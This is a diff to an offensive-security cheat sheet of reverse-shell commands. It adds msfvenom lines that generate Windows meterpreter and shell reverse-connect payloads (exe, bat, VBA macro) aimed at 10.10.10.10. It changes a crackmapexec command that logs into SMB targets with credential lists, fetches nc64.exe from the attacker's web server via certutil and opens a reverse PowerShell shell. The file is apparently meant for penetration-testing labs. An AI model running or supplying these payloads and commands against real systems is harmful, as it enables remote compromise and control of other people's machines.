@@ -1,6 +1,30 @@
 % deadbeefs revshells Cheats
 
+# $ wordlist: fdfind . $(pwd) /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u 
+# $ IP: ip a s tun0 | grep 'inet\ ' | awk '{print $2}' | cut -d '/' -f 1
+
+$ IP: for adaptername in $(for i in "$(ip a s | sort -r | grep -E $'[[:digit:]]:[ ]')"; do echo $(echo $i | awk '{print $2}' | replace : ''); done); do ip a s $adaptername | grep 'inet\ ' | awk '{print $2}' | cut -d '/' -f 1 ; done | uniq
+
+
+# x86 normal
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+
+# x64 (CMD Single Stage)
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+
+# reverse HTTP
+msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+
+# reverse HTTPS
+msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+
+# Powershell Payload
+msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.10.10 LPORT=4545 > shell.bat
+
+# Macro Payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f vba
+
 
 # crackmapexec (windows specific) download nc64.exe from your (tun0 port 80, webserver, revshell on port 443) box and execute it.
-IP="$(ip a s tun0 | grep 'inet\ ' | awk '{print $2}' | cut -d '/' -f 1)"; cme smb <target> -u <user-list> -d <target> -p <pass-list> -X "certutil.exe -urlcache -split -f http://$IP/nc64.exe nc64.exe; .\nc64.exe $IP 443 -e powershell.exe";   
+cme smb <target> -u <user-list> -d <target> -p <pass-list> -X "certutil.exe -urlcache -split -f http://<IP>/nc64.exe nc64.exe; .\nc64.exe <IP> 443 -e powershell.exe";   
 
